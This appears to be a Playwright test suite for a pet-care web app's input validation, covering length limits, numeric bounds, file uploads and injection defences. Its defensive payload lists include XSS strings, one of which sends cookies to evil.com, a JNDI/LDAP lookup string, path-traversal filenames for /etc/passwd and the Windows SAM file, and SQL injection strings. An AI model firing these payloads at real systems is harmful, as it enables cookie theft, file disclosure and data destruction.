import { test, expect } from '@playwright/test';
import { AuthPage } from '../../page-objects/auth-page';
import { PetsPage } from '../../page-objects/pets-page';
import { AnalysisPage } from '../../page-objects/analysis-page';
import { CommunityPage } from '../../page-objects/community-page';
import { TestDataManager } from '../../utils/test-data-manager';

test.describe('输入验证边界测试', () => {
  let authPage: AuthPage;
  let petsPage: PetsPage;
  let analysisPage: AnalysisPage;
  let communityPage: CommunityPage;
  let testDataManager: TestDataManager;

  test.beforeEach(async ({ page }) => {
    authPage = new AuthPage(page);
    petsPage = new PetsPage(page);
    analysisPage = new AnalysisPage(page);
    communityPage = new CommunityPage(page);
    testDataManager = new TestDataManager();
    
    await page.goto('/');
  });

  test.afterEach(async () => {
    await testDataManager.cleanup();
  });

  test.describe('字符串长度边界测试', () => {
    test('用户名最小长度边界测试', async ({ page }) => {
      await authPage.goToRegister();
      
      // 测试空用户名
      await authPage.fillRegistrationForm({
        username: '',
        email: 'test@example.com',
        password: 'Password123!'
      });
      
      await expect(page.locator('[data-testid="username-error"]')).toContainText('用户名不能为空');
      
      // 测试1个字符（低于最小长度）
      await authPage.fillRegistrationForm({
        username: 'a',
        email: 'test@example.com',
        password: 'Password123!'
      });
      
      await expect(page.locator('[data-testid="username-error"]')).toContainText('用户名至少需要2个字符');
      
      // 测试2个字符（最小有效长度）
      await authPage.fillRegistrationForm({
        username: 'ab',
        email: 'test@example.com',
        password: 'Password123!'
      });
      
      await expect(page.locator('[data-testid="username-error"]')).not.toBeVisible();
    });

    test('用户名最大长度边界测试', async ({ page }) => {
      await authPage.goToRegister();
      
      // 测试50个字符（最大有效长度）
      const maxValidUsername = 'a'.repeat(50);
      await authPage.fillRegistrationForm({
        username: maxValidUsername,
        email: 'test@example.com',
        password: 'Password123!'
      });
      
      await expect(page.locator('[data-testid="username-error"]')).not.toBeVisible();
      
      // 测试51个字符（超过最大长度）
      const tooLongUsername = 'a'.repeat(51);
      await authPage.fillRegistrationForm({
        username: tooLongUsername,
        email: 'test@example.com',
        password: 'Password123!'
      });
      
      await expect(page.locator('[data-testid="username-error"]')).toContainText('用户名不能超过50个字符');
    });

    test('宠物名称长度边界测试', async ({ page }) => {
      // 先登录
      const testUser = await testDataManager.createTestUser();
      await authPage.login(testUser.email, testUser.password);
      
      await petsPage.goToPetManagement();
      await petsPage.clickAddPet();
      
      // 测试空名称
      await petsPage.fillPetForm({
        name: '',
        type: 'dog',
        breed: '金毛',
        age: 2,
        weight: 25
      });
      
      await expect(page.locator('[data-testid="pet-name-error"]')).toContainText('宠物名称不能为空');
      
      // 测试100个字符（超过最大长度）
      const tooLongName = '宠物名称'.repeat(25); // 100个字符
      await petsPage.fillPetForm({
        name: tooLongName,
        type: 'dog',
        breed: '金毛',
        age: 2,
        weight: 25
      });
      
      await expect(page.locator('[data-testid="pet-name-error"]')).toContainText('宠物名称不能超过30个字符');
    });
  });

  test.describe('特殊字符输入测试', () => {
    test('用户名特殊字符验证', async ({ page }) => {
      await authPage.goToRegister();
      
      const specialCharacters = [
        '<script>alert("xss")</script>',
        '../../etc/passwd',
        'DROP TABLE users;',
        '${jndi:ldap://evil.com/a}',
        '{{7*7}}',
        '<img src=x onerror=alert(1)>',
        'javascript:alert(1)',
        '\'; DROP TABLE users; --'
      ];
      
      for (const specialChar of specialCharacters) {
        await authPage.fillRegistrationForm({
          username: specialChar,
          email: 'test@example.com',
          password: 'Password123!'
        });
        
        // 验证特殊字符被正确处理或拒绝
        const errorMessage = await page.locator('[data-testid="username-error"]').textContent();
        expect(errorMessage).toContain('用户名包含无效字符');
      }
    });

    test('宠物描述HTML注入防护测试', async ({ page }) => {
      const testUser = await testDataManager.createTestUser();
      await authPage.login(testUser.email, testUser.password);
      
      await petsPage.goToPetManagement();
      await petsPage.clickAddPet();
      
      const maliciousInputs = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(1)">',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<svg onload="alert(1)">',
        '<div onclick="alert(1)">Click me</div>'
      ];
      
      for (const maliciousInput of maliciousInputs) {
        await petsPage.fillPetForm({
          name: '测试宠物',
          type: 'dog',
          breed: '金毛',
          age: 2,
          weight: 25,
          description: maliciousInput
        });
        
        await petsPage.submitPetForm();
        
        // 验证恶意脚本没有被执行
        const alertDialogs = page.locator('dialog[role="alertdialog"]');
        await expect(alertDialogs).toHaveCount(0);
        
        // 验证内容被正确转义
        const description = await page.locator('[data-testid="pet-description"]').textContent();
        expect(description).not.toContain('<script>');
        expect(description).not.toContain('<img');
      }
    });

    test('社区帖子内容XSS防护测试', async ({ page }) => {
      const testUser = await testDataManager.createTestUser();
      await authPage.login(testUser.email, testUser.password);
      
      await communityPage.goToCommunity();
      await communityPage.clickCreatePost();
      
      const xssPayloads = [
        '<script>document.cookie="stolen="+document.cookie</script>',
        '<img src=x onerror=fetch("http://evil.com/steal?cookie="+document.cookie)>',
        '<svg/onload=eval(atob("YWxlcnQoMSk="))>',
        '<details open ontoggle=alert(1)>',
        '<marquee onstart=alert(1)>XSS</marquee>'
      ];
      
      for (const payload of xssPayloads) {
        await communityPage.fillPostForm({
          title: '测试帖子',
          content: payload,
          tags: ['测试']
        });
        
        await communityPage.submitPost();
        
        // 验证XSS攻击被阻止
        const postContent = await page.locator('[data-testid="post-content"]').textContent();
        expect(postContent).not.toContain('<script>');
        expect(postContent).not.toContain('onerror=');
        expect(postContent).not.toContain('onload=');
      }
    });
  });

  test.describe('数值边界测试', () => {
    test('宠物年龄边界值测试', async ({ page }) => {
      const testUser = await testDataManager.createTestUser();
      await authPage.login(testUser.email, testUser.password);
      
      await petsPage.goToPetManagement();
      await petsPage.clickAddPet();
      
      // 测试负数年龄
      await petsPage.fillPetForm({
        name: '测试宠物',
        type: 'dog',
        breed: '金毛',
        age: -1,
        weight: 25
      });
      
      await expect(page.locator('[data-testid="pet-age-error"]')).toContainText('年龄必须大于0');
      
      // 测试0岁（边界值）
      await petsPage.fillPetForm({
        name: '测试宠物',
        type: 'dog',
        breed: '金毛',
        age: 0,
        weight: 25
      });
      
      await expect(page.locator('[data-testid="pet-age-error"]')).toContainText('年龄必须大于0');
      
      // 测试1岁（最小有效值）
      await petsPage.fillPetForm({
        name: '测试宠物',
        type: 'dog',
        breed: '金毛',
        age: 1,
        weight: 25
      });
      
      await expect(page.locator('[data-testid="pet-age-error"]')).not.toBeVisible();
      
      // 测试极大年龄值
      await petsPage.fillPetForm({
        name: '测试宠物',
        type: 'dog',
        breed: '金毛',
        age: 999,
        weight: 25
      });
      
      await expect(page.locator('[data-testid="pet-age-error"]')).toContainText('年龄不能超过50岁');
    });

    test('宠物体重边界值测试', async ({ page }) => {
      const testUser = await testDataManager.createTestUser();
      await authPage.login(testUser.email, testUser.password);
      
      await petsPage.goToPetManagement();
      await petsPage.clickAddPet();
      
      // 测试负数体重
      await petsPage.fillPetForm({
        name: '测试宠物',
        type: 'dog',
        breed: '金毛',
        age: 2,
        weight: -5
      });
      
      await expect(page.locator('[data-testid="pet-weight-error"]')).toContainText('体重必须大于0');
      
      // 测试0体重
      await petsPage.fillPetForm({
        name: '测试宠物',
        type: 'dog',
        breed: '金毛',
        age: 2,
        weight: 0
      });
      
      await expect(page.locator('[data-testid="pet-weight-error"]')).toContainText('体重必须大于0');
      
      // 测试小数体重（有效）
      await petsPage.fillPetForm({
        name: '测试宠物',
        type: 'dog',
        breed: '金毛',
        age: 2,
        weight: 0.5
      });
      
      await expect(page.locator('[data-testid="pet-weight-error"]')).not.toBeVisible();
      
      // 测试极大体重值
      await petsPage.fillPetForm({
        name: '测试宠物',
        type: 'dog',
        breed: '金毛',
        age: 2,
        weight: 1000
      });
      
      await expect(page.locator('[data-testid="pet-weight-error"]')).toContainText('体重不能超过200公斤');
    });
  });

  test.describe('文件上传边界测试', () => {
    test('图片文件大小限制测试', async ({ page }) => {
      const testUser = await testDataManager.createTestUser();
      await authPage.login(testUser.email, testUser.password);
      
      await analysisPage.goToAnalysis();
      
      // 测试超大文件（模拟10MB以上）
      const largeFileBuffer = Buffer.alloc(11 * 1024 * 1024); // 11MB
      const largeFile = new File([largeFileBuffer], 'large-image.jpg', { type: 'image/jpeg' });
      
      await page.setInputFiles('[data-testid="image-upload"]', {
        name: 'large-image.jpg',
        mimeType: 'image/jpeg',
        buffer: largeFileBuffer
      });
      
      await expect(page.locator('[data-testid="upload-error"]')).toContainText('文件大小不能超过10MB');
      
      // 测试空文件
      const emptyFileBuffer = Buffer.alloc(0);
      await page.setInputFiles('[data-testid="image-upload"]', {
        name: 'empty.jpg',
        mimeType: 'image/jpeg',
        buffer: emptyFileBuffer
      });
      
      await expect(page.locator('[data-testid="upload-error"]')).toContainText('文件不能为空');
    });

    test('文件类型验证测试', async ({ page }) => {
      const testUser = await testDataManager.createTestUser();
      await authPage.login(testUser.email, testUser.password);
      
      await analysisPage.goToAnalysis();
      
      const invalidFileTypes = [
        { name: 'malicious.exe', type: 'application/x-msdownload' },
        { name: 'script.js', type: 'application/javascript' },
        { name: 'document.pdf', type: 'application/pdf' },
        { name: 'archive.zip', type: 'application/zip' },
        { name: 'video.mp4', type: 'video/mp4' }
      ];
      
      for (const fileType of invalidFileTypes) {
        const fileBuffer = Buffer.from('fake file content');
        
        await page.setInputFiles('[data-testid="image-upload"]', {
          name: fileType.name,
          mimeType: fileType.type,
          buffer: fileBuffer
        });
        
        await expect(page.locator('[data-testid="upload-error"]')).toContainText('只支持JPG、PNG、GIF格式的图片');
      }
    });

    test('文件名安全性测试', async ({ page }) => {
      const testUser = await testDataManager.createTestUser();
      await authPage.login(testUser.email, testUser.password);
      
      await analysisPage.goToAnalysis();
      
      const maliciousFileNames = [
        '../../../etc/passwd',
        '..\\..\\windows\\system32\\config\\sam',
        '<script>alert(1)</script>.jpg',
        'file with spaces and special chars!@#$.jpg',
        'very-long-filename-that-exceeds-normal-limits-and-might-cause-issues-with-filesystem-or-database-storage.jpg'
      ];
      
      for (const fileName of maliciousFileNames) {
        const fileBuffer = Buffer.from('fake image content');
        
        await page.setInputFiles('[data-testid="image-upload"]', {
          name: fileName,
          mimeType: 'image/jpeg',
          buffer: fileBuffer
        });
        
        // 验证文件名被正确处理或拒绝
        const uploadStatus = await page.locator('[data-testid="upload-status"]').textContent();
        expect(uploadStatus).not.toContain('../../');
        expect(uploadStatus).not.toContain('<script>');
      }
    });
  });

  test.describe('SQL注入防护测试', () => {
    test('登录表单SQL注入测试', async ({ page }) => {
      await authPage.goToLogin();
      
      const sqlInjectionPayloads = [
        "admin' OR '1'='1",
        "admin'; DROP TABLE users; --",
        "admin' UNION SELECT * FROM users --",
        "admin' OR 1=1 --",
        "'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --"
      ];
      
      for (const payload of sqlInjectionPayloads) {
        await authPage.fillLoginForm(payload, 'password');
        await authPage.submitLogin();
        
        // 验证SQL注入被阻止
        const errorMessage = await page.locator('[data-testid="login-error"]').textContent();
        expect(errorMessage).toContain('用户名或密码错误');
        
        // 验证没有意外登录成功
        await expect(page.locator('[data-testid="user-menu"]')).not.toBeVisible();
      }
    });

    test('搜索功能SQL注入测试', async ({ page }) => {
      const testUser = await testDataManager.createTestUser();
      await authPage.login(testUser.email, testUser.password);
      
      await petsPage.goToPetManagement();
      
      const searchInjectionPayloads = [
        "'; DROP TABLE pets; --",
        "' UNION SELECT * FROM users --",
        "' OR 1=1 --",
        "'; UPDATE pets SET name='hacked' WHERE 1=1; --"
      ];
      
      for (const payload of searchInjectionPayloads) {
        await petsPage.searchPets(payload);
        
        // 验证搜索结果正常，没有执行恶意SQL
        const searchResults = await page.locator('[data-testid="pet-search-results"]');
        await expect(searchResults).toBeVisible();
        
        // 验证没有数据被篡改
        const petNames = await page.locator('[data-testid="pet-name"]').allTextContents();
        expect(petNames).not.toContain('hacked');
      }
    });
  });

  test.describe('输入长度极限测试', () => {
    test('超长文本输入处理', async ({ page }) => {
      const testUser = await testDataManager.createTestUser();
      await authPage.login(testUser.email, testUser.password);
      
      await communityPage.goToCommunity();
      await communityPage.clickCreatePost();
      
      // 生成超长内容（10000字符）
      const veryLongContent = 'A'.repeat(10000);
      
      await communityPage.fillPostForm({
        title: '测试超长内容',
        content: veryLongContent,
        tags: ['测试']
      });
      
      await communityPage.submitPost();
      
      // 验证超长内容被正确处理
      const errorMessage = await page.locator('[data-testid="post-error"]').textContent();
      expect(errorMessage).toContain('内容长度不能超过5000字符');
    });

    test('Unicode字符边界测试', async ({ page }) => {
      await authPage.goToRegister();
      
      const unicodeTestCases = [
        '测试用户名123', // 中文+数字
        'тест', // 西里尔字母
        'テスト', // 日文
        '🐕🐱🐾', // Emoji
        'café', // 带重音符号
        'Ñoño', // 西班牙语字符
      ];
      
      for (const username of unicodeTestCases) {
        await authPage.fillRegistrationForm({
          username: username,
          email: 'test@example.com',
          password: 'Password123!'
        });
        
        // 验证Unicode字符被正确处理
        await expect(page.locator('[data-testid="username-error"]')).not.toBeVisible();
      }
    });
  });
});